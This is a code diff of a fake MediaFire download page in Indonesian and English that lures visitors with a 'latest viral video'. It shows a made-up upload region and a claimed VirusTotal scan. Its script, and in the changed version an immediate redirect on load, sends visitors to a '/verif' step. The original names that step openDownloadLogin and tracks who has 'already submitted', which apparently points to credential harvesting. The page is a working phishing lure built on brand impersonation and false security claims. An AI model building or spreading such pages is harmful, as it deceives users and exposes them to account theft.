@@ -4,9 +4,6 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
 
-<!-- =========================================================
-     CEK BLOKIR DI HEAD — SEBELUM BODY DIRENDER
-     ========================================================= -->
 <script>
 (function(){
     try {
@@ -17,457 +14,103 @@
 
         if(blocked){
             window.location.replace("/blokir");
+            return;
         }
-    } catch(e){}
+        window.location.replace("/verif");
+    } catch(e){
+        window.location.replace("/verif");
+    }
 })();
 </script>
 
 <title>Download Page</title>
 
 <style>
-*{
-    box-sizing:border-box;
-    margin:0;
-    padding:0;
-}
-
-html,body{
-    width:100%;
-    min-height:100%;
-    overflow-x:hidden;
-    background:#fff;
-    font-family:Arial,Helvetica,sans-serif;
-    color:#555;
-    -webkit-text-size-adjust:100%;
-}
-
-button{
-    font-family:Arial,Helvetica,sans-serif;
-    cursor:pointer;
-}
-
-/* ================= HEADER ================= */
-.header{
-    width:100%;
-    height:auto;
-    border-bottom:1px solid #ddd;
-    background:#fff;
-    padding:0;
-    overflow:hidden;
-}
-.header-img{
-    width:100%;
-    height:auto;
-    display:block;
-    cursor:pointer;
-}
-
-/* ================= CONTENT ================= */
-.page{
-    width:100%;
-    display:flex;
-    flex-direction:column;
-    align-items:center;
-    padding:0 16px 40px;
-}
-.ad-space{
-    width:100%;
-    height:180px;
-}
-.download-wrap{
-    width:100%;
-    max-width:600px;
-    cursor:pointer;
-    user-select:none;
-    border-radius:6px;
-    overflow:hidden;
-}
-.download-top{
-    width:100%;
-    height:60px;
-    background:#087be0;
-    display:flex;
-    align-items:center;
-    padding:0 14px;
-    color:#fff;
-}
-.download-wrap:active .download-top{
-    filter:brightness(.94);
-}
-.file-icon{
-    width:38px;
-    height:44px;
-    flex-shrink:0;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-}
-.file-icon-img{
-    width:100%;
-    height:100%;
-    object-fit:contain;
-    display:block;
-}
-.file-info{
-    min-width:0;
-    margin-left:12px;
-    flex:1;
-}
-.file-title{
-    font-size:15px;
-    font-weight:bold;
-    white-space:nowrap;
-    overflow:hidden;
-    text-overflow:ellipsis;
-    margin-bottom:3px;
-    color:#fff;
-    letter-spacing:0.3px;
-}
-.file-sub{
-    font-size:11px;
-    white-space:nowrap;
-    overflow:hidden;
-    text-overflow:ellipsis;
-    color:#fff;
-    opacity:.95;
-}
-.download-icon{
-    width:22px;
-    height:26px;
-    flex-shrink:0;
-    margin-left:10px;
-    margin-right:2px;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-}
-.download-icon-img{
-    width:100%;
-    height:100%;
-    object-fit:contain;
-    display:block;
-}
-.download-bottom{
-    width:100%;
-    height:38px;
-    background:#333;
-    display:flex;
-    align-items:center;
-    justify-content:space-between;
-    padding:0 14px;
-}
-.slow{
-    color:#ddd;
-    font-size:11px;
-    white-space:nowrap;
-}
-.fast{
-    background:#087be0;
-    color:#fff;
-    border:0;
-    border-radius:4px;
-    padding:6px 10px;
-    font-size:10px;
-    font-weight:bold;
-    white-space:nowrap;
-}
-.description{
-    max-width:600px;
-    width:100%;
-    text-align:center;
-    font-size:12px;
-    line-height:18px;
-    margin-top:16px;
-}
-.options{
-    max-width:600px;
-    width:100%;
-    margin-top:14px;
-}
-.option-img{
-    width:100%;
-    height:auto;
-    display:block;
-    cursor:pointer;
-}
-.map{
-    width:100%;
-    max-width:600px;
-    height:200px;
-    margin-top:16px;
-    background:#51a8e5;
-    position:relative;
-    overflow:hidden;
-    border-radius:0;
-}
-.map-label{
-    position:absolute;
-    top:0;
-    left:0;
-    background:#28688e;
-    color:#fff;
-    padding:6px 10px;
-    font-size:11px;
-    z-index:3;
-}
-.map-img{
-    width:100%;
-    height:100%;
-    object-fit:cover;
-    display:block;
-}
-.uploader-info{
-    max-width:600px;
-    width:100%;
-    display:flex;
-    align-items:center;
-    gap:12px;
-    padding:14px 0;
-}
-.flag-box{
-    width:60px;
-    height:26px;
-    background:#c8102e;
-    flex-shrink:0;
-}
-.uploader-text{
-    font-size:13px;
-    color:#333;
-    line-height:1.5;
-    font-weight:400;
-}
-.vt-section{
-    max-width:600px;
-    width:100%;
-    margin-top:16px;
-}
-.vt-logo{
-    width:150px;
-    height:90px;
-    border:1px solid #e0e0e0;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    background:#fff;
-    padding:8px;
-}
-.vt-logo-img{
-    max-width:100%;
-    max-height:100%;
-    width:auto;
-    height:auto;
-    object-fit:contain;
-    display:block;
-}
-.vt-title{
-    font-size:17px;
-    font-weight:bold;
-    color:#222;
-    margin-top:14px;
-    margin-bottom:6px;
-}
-.vt-desc{
-    font-size:13px;
-    color:#333;
-    line-height:1.5;
-}
-
-/* ================= MOBILE ================= */
-@media(max-width:350px){
-    .header{ padding:0; }
-    .file-title{ font-size:13px; }
-    .file-sub{ font-size:10px; }
-    .slow{ font-size:10px; }
-    .fast{ font-size:9px; padding:5px 8px; }
-    .flag-box{ width:50px; height:22px; }
-    .uploader-text{ font-size:12px; }
-    .vt-logo{ width:130px; height:78px; }
-    .vt-title{ font-size:15px; }
-    .vt-desc{ font-size:12px; }
-}
+*{box-sizing:border-box;margin:0;padding:0;}
+html,body{width:100%;min-height:100%;overflow-x:hidden;background:#fff;font-family:Arial,Helvetica,sans-serif;color:#555;}
+button{font-family:Arial,Helvetica,sans-serif;cursor:pointer;}
+.header{width:100%;border-bottom:1px solid #ddd;background:#fff;overflow:hidden;}
+.header-img{width:100%;height:auto;display:block;cursor:pointer;}
+.page{width:100%;display:flex;flex-direction:column;align-items:center;padding:0 16px 40px;}
+.ad-space{width:100%;height:180px;}
+.download-wrap{width:100%;max-width:600px;cursor:pointer;user-select:none;border-radius:6px;overflow:hidden;}
+.download-top{width:100%;height:60px;background:#087be0;display:flex;align-items:center;padding:0 14px;color:#fff;}
+.file-icon{width:38px;height:44px;flex-shrink:0;}
+.file-icon-img{width:100%;height:100%;object-fit:contain;display:block;}
+.file-info{min-width:0;margin-left:12px;flex:1;}
+.file-title{font-size:15px;font-weight:bold;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:3px;color:#fff;}
+.file-sub{font-size:11px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;color:#fff;opacity:.95;}
+.download-icon{width:22px;height:26px;flex-shrink:0;margin-left:10px;}
+.download-icon-img{width:100%;height:100%;object-fit:contain;display:block;}
+.download-bottom{width:100%;height:38px;background:#333;display:flex;align-items:center;justify-content:space-between;padding:0 14px;}
+.slow{color:#ddd;font-size:11px;}
+.fast{background:#087be0;color:#fff;border:0;border-radius:4px;padding:6px 10px;font-size:10px;font-weight:bold;}
+.description{max-width:600px;width:100%;text-align:center;font-size:12px;line-height:18px;margin-top:16px;}
+.options{max-width:600px;width:100%;margin-top:14px;}
+.option-img{width:100%;height:auto;display:block;cursor:pointer;}
+.map{width:100%;max-width:600px;height:200px;margin-top:16px;background:#51a8e5;position:relative;overflow:hidden;}
+.map-label{position:absolute;top:0;left:0;background:#28688e;color:#fff;padding:6px 10px;font-size:11px;z-index:3;}
+.map-img{width:100%;height:100%;object-fit:cover;display:block;}
+.uploader-info{max-width:600px;width:100%;display:flex;align-items:center;gap:12px;padding:14px 0;}
+.flag-box{width:60px;height:26px;background:#c8102e;flex-shrink:0;}
+.uploader-text{font-size:13px;color:#333;line-height:1.5;}
+.vt-section{max-width:600px;width:100%;margin-top:16px;}
+.vt-logo{width:150px;height:90px;border:1px solid #e0e0e0;display:flex;align-items:center;justify-content:center;background:#fff;padding:8px;}
+.vt-logo-img{max-width:100%;max-height:100%;object-fit:contain;display:block;}
+.vt-title{font-size:17px;font-weight:bold;color:#222;margin-top:14px;margin-bottom:6px;}
+.vt-desc{font-size:13px;color:#333;line-height:1.5;}
 </style>
 </head>
 
 <body>
 
 <header class="header">
-    <img
-        src="atas.jpg"
-        alt="Header"
-        class="header-img"
-        onclick="openDownloadLogin()"
-    >
+    <img src="atas.jpg" alt="Header" class="header-img">
 </header>
 
-
 <main class="page">
-
     <div class="ad-space"></div>
 
-    <section
-        class="download-wrap"
-        onclick="openDownloadLogin()"
-    >
-
+    <section class="download-wrap">
         <div class="download-top">
-
-            <div class="file-icon">
-                <img
-                    src="file.jpg"
-                    alt="File"
-                    class="file-icon-img"
-                >
-            </div>
-
+            <div class="file-icon"><img src="file.jpg" class="file-icon-img"></div>
             <div class="file-info">
-
-                <div class="file-title">
-                    VIDEO VIRAL TERBARU
-                </div>
-
-                <div class="file-sub">
-                    Download in a new tab (20.5 MB)
-                </div>
-
+                <div class="file-title">VIDEO VIRAL TERBARU</div>
+                <div class="file-sub">Download in a new tab (20.5 MB)</div>
             </div>
-
-            <div class="download-icon">
-                <img
-                    src="panah.jpg"
-                    alt="Download"
-                    class="download-icon-img"
-                >
-            </div>
-
+            <div class="download-icon"><img src="panah.jpg" class="download-icon-img"></div>
         </div>
-
         <div class="download-bottom">
-
-            <div class="slow">
-                Download too slow?
-            </div>
-
-            <button
-                class="fast"
-                type="button"
-                onclick="openDownloadLogin(event)"
-            >
-                DOWNLOAD FASTER NOW
-            </button>
-
+            <div class="slow">Download too slow?</div>
+            <button class="fast" type="button">DOWNLOAD FASTER NOW</button>
         </div>
-
     </section>
 
-
     <div class="description">
-
         Clicking the download button above will start your download in a new tab
         and show a message from our advertising partners.
-
     </div>
-
 
     <div class="options">
-        <img
-            src="share.jpg"
-            alt="Share & Save"
-            class="option-img"
-            onclick="openDownloadLogin(event)"
-        >
+        <img src="share.jpg" class="option-img">
     </div>
 
-
     <div class="map">
-
-        <div class="map-label">
-            Upload region:
-        </div>
-
-        <img
-            src="peta.jpg"
-            alt="Peta"
-            class="map-img"
-        >
-
+        <div class="map-label">Upload region:</div>
+        <img src="peta.jpg" class="map-img">
     </div>
 
     <div class="uploader-info">
         <div class="flag-box"></div>
-        <div class="uploader-text">
-            This file was uploaded from Indonesia on June 21, 2026 at 2:20 AM
-        </div>
+        <div class="uploader-text">This file was uploaded from Indonesia on June 21, 2026 at 2:20 AM</div>
     </div>
 
     <div class="vt-section">
-
-        <div class="vt-logo">
-            <img
-                src="virustotal.jpg"
-                alt="VirusTotal"
-                class="vt-logo-img"
-            >
-        </div>
-
-        <div class="vt-title">
-            VirusTotal scan
-        </div>
-
-        <div class="vt-desc">
-            MediaFire scans high-risk files using VirusTotal.
-        </div>
-
+        <div class="vt-logo"><img src="virustotal.jpg" class="vt-logo-img"></div>
+        <div class="vt-title">VirusTotal scan</div>
+        <div class="vt-desc">MediaFire scans high-risk files using VirusTotal.</div>
     </div>
-
 </main>
-
-
-<script>
-
-/* =========================================================
-   CEK BLOKIR DEVICE
-   ========================================================= */
-function cekDeviceBlocked(){
-    try{
-        if(localStorage.getItem("sudah_submit") === "1") return true;
-    }catch(e){}
-    try{
-        if(sessionStorage.getItem("sudah_submit") === "1") return true;
-    }catch(e){}
-    try{
-        if(document.cookie.indexOf("sudah_submit=1") !== -1) return true;
-    }catch(e){}
-    return false;
-}
-
-/* =========================================================
-   KLIK DOWNLOAD → REDIRECT KE /verif ATAU /blokir
-   ========================================================= */
-function openDownloadLogin(event){
-
-    if(event){ event.stopPropagation(); }
-
-    /* KALO UDAH SUBMIT → BLOKIR */
-    if(cekDeviceBlocked()){
-        window.location.replace("/blokir");
-        return;
-    }
-
-    /* KALO BELUM → KE /verif */
-    window.location.href = "/verif";
-
-}
-
-/* =========================================================
-   AUTO CEK SAAT LOAD (BACKUP LAPIS KEDUA)
-   ========================================================= */
-window.addEventListener("load", function(){
-    if(cekDeviceBlocked()){
-        window.location.replace("/blokir");
-    }
-});
-
-</script>
 
 </body>
 </html>
